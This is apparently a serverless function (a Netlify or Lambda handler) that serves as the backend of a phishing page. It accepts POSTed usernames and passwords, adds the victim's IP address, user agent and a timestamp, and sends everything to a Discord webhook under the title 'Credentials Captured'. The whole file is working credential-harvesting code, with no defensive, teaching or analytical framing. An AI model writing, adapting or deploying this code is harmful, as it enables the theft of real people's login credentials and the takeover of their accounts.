exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: 'Method Not Allowed' };
  }

  try {
    const data = JSON.parse(event.body || '{}');
    const username = data.username || '(empty)';
    const password = data.password || '(empty)';

    const userAgent = event.headers['user-agent'] || 'unknown';
    const ip = event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown';
    const time = new Date().toISOString();

    const webhookUrl = process.env.DISCORD_WEBHOOK;
    if (!webhookUrl) {
      return { statusCode: 500, headers, body: 'Webhook not configured' };
    }

    const message = {
      content: '🎣 **New Capture**',
      embeds: [{
        title: 'Credentials Captured',
        color: 0xff0000,
        fields: [
          { name: '👤 Username', value: username, inline: true },
          { name: '🔑 Password', value: password, inline: true },
          { name: '🌐 IP', value: ip, inline: false },
          { name: '📱 User Agent', value: userAgent.substring(0, 200), inline: false },
          { name: '🕒 Time', value: time, inline: false }
        ]
      }]
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    });

    return { statusCode: 200, headers, body: JSON.stringify({ ok: true }) };
  } catch (err) {
    return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
  }
};
